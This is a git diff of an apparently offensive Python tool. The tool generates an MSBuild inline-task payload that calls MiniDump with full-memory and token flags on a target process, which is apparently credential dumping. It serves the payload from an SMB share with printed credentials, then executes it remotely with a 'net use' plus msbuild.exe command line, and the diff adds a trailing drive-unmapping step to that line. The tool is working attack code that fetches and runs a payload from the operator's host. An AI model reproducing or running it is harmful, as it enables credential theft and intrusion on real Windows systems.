@@ -688,14 +688,13 @@ public class %s : Task, ITask {
                 %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);
 
             }
-			System.Diagnostics.Process.Start("CMD.exe", "/C net use %s: /delete /yes");
 			return true;
         }}
                                 ]]>
                         </Code>
                 </Task>
         </UsingTask>
-</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, processes, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p, drive_letter)
+</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, processes, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
 
     with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
         f.write(xml_payload)
@@ -924,7 +923,7 @@ if __name__ == '__main__':
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
 
         print("[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
-        command = r"net use {}: \\{}\{} /user:{} {} & C:\\Windows\\Microsoft.NET\\framework64\\v4.0.30319\\msbuild.exe {}:\{}.xml".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name)
+        command = r"net use {}: \\{}\{} /user:{} {} & C:\\Windows\\Microsoft.NET\\framework64\\v4.0.30319\\msbuild.exe {}:\{}.xml & net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
 
